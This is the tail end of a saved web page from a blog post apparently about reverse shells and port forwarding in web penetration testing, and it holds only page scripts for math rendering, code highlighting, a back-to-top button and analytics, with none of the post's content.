Blog/MathJax.jsconfig=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script><script type="text/javascript">$(document).ready(function(){MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/highlight.min.js"></script><script src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/gallery.js"></script><script>$(document).ready(function(){hljs.initHighlightingOnLoad()})</script><div id="totop" style="position:fixed;bottom:50px;right:30px;cursor:pointer;opacity:1"> <a title="back to top"><img src="./ Web渗透中的反弹Shell与端口转发的奇淫技巧  Virink's Blog/totop.png" style="width:30px;height:30px"/></a></div><script>!function(o){var t=o("#totop");t.hide(),o(window).scroll(function(){o(document).scrollTop()>100?o(t).stop().fadeTo(300,1):o(t).stop().fadeTo(300,0)}),o(t).click(function(){return o("html, body").animate({scrollTop:0},500),!1})}(jQuery)</script><script>!function(e,t,a,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=t.createElement(a),s=t.getElementsByTagName(a)[0],o.async=1,o.src="https://www.google-analytics.com/analytics.js",s.parentNode.insertBefore(o,s)}(window,document,"script",0,"ga"),ga("create","UA-83885261-1","auto"),ga("send","pageview")</script> <!--[if IE 6]><script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script><![endif]--></body></html>
